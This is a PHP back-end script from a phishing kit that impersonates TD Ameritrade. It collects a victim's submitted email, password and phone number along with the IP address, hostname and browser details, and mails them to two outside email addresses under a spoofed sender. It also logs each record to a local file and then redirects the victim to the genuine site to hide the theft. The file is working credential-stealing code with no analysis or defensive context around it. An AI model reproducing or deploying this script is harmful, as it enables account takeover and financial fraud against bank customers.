<?php

session_start();

$ip = getenv("REMOTE_ADDR");$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);

$message  = "========+[ TD Ameritrade Email 2 ]+=========\n";
$message .= "Email Address : ".$_POST['email']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "Phone Number : ".$_POST['phone']."\n";
$message .= "=============+Codewizard+===========\n";
$message .= "IP: ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "Date And Time : ".$date."\n";
$message .= "Browser Details : ".$user_agent."\n";
$send = "donaldgloria93@gmail.com, presidentson090@yandex.com";
$subject = "TD Ameritrade Email 2 | $ip";
$headers = "From: TDAMER  <legit@mrmoz.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
$fp = fopen('XXXaxmexXXX00SREZUxxxsassssssilkklllllxSDSSSVSSS.txt', 'a');
fwrite($fp, $message);
fclose($fp);
header("Location: https://www.tdameritrade.com/home.page");
?>
